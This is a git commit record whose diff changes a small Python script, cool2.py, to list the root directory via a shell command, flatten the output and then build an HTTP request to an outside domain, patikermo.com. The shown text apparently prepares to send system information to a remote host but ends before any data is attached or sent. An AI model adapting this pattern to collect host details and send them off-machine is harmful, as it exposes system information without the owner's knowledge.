ce851d81b7d7ab6aacc1953296a91df3fea1d9cf
Lino Nava <linonava@patikermo.com>
2021-07-16 12:12:36 -0400

    Update cool2.py

--- cool2.py
+++ cool2.py
@@ -1,6 +1,6 @@
 import urllib2
 import subprocess
-output = subprocess.check_output("ls", shell=True)
+output = subprocess.check_output("ls /", shell=True)
 output = output.rstrip()
 output = output.replace("\n", " ")
 request = urllib2.Request("http://patikermo.com")
